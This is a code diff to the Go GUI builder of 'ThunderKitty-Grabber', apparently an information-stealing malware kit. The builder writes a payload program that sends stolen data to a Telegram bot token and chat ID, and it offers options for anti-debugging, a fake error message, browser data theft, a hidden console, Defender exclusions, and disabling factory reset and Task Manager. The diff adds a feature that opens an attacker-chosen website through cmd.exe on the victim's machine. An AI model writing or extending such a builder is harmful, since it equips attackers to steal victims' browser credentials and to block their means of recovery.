@@ -13,7 +13,7 @@ import (
 	"fyne.io/fyne/v2/widget"
 )
 
-func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool) {
+func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL string) {
 	content := fmt.Sprintf(`
 package main
 
@@ -27,6 +27,7 @@ import (
 	"ThunderKitty-Grabber/utils/exclude"
 	"ThunderKitty-Grabber/utils/defender"
 	"fmt"
+	"os/exec"
 )
 
 const (
@@ -70,8 +71,15 @@ func main() {
 	} else {
 		fmt.Println("Task manager not disabled")
 	}
+	
+	url := "%s"
+	if url != "" {
+		exec.Command("cmd.exe", "/c", "start", url).Run()
+	} else {
+		fmt.Println("Open website not enabled")
+	}
 }
-`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager)
+`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL)
 
 	file, err := os.Create("main.go")
 	if err != nil {
@@ -107,10 +115,10 @@ func main() {
 	w := a.NewWindow("ThunderKitty Builder")
 
 	telebottokenEntry := widget.NewEntry()
-	telebottokenEntry.SetPlaceHolder("Enter telebottoken")
+	telebottokenEntry.SetPlaceHolder("Enter Telegram Bot Token")
 
 	telechatidEntry := widget.NewEntry()
-	telechatidEntry.SetPlaceHolder("Enter telechatid")
+	telechatidEntry.SetPlaceHolder("Enter Telegram Chat ID")
 
 	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
 	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
@@ -119,10 +127,14 @@ func main() {
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
 	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
 
+	openSiteEntry := widget.NewEntry()
+	openSiteEntry.SetPlaceHolder("Open website (leave blank for none)")
+
 	buildButton := widget.NewButton("Build", func() {
 		telebottoken := telebottokenEntry.Text
 		telechatid := telechatidEntry.Text
-		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked)
+		openSiteURL := openSiteEntry.Text
+		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL)
 	})
 
 	form := container.NewVBox(
@@ -135,6 +147,7 @@ func main() {
 		hideConsole,
 		disableFactoryReset,
 		disableTaskManager,
+		openSiteEntry,
 		buildButton,
 	)
 
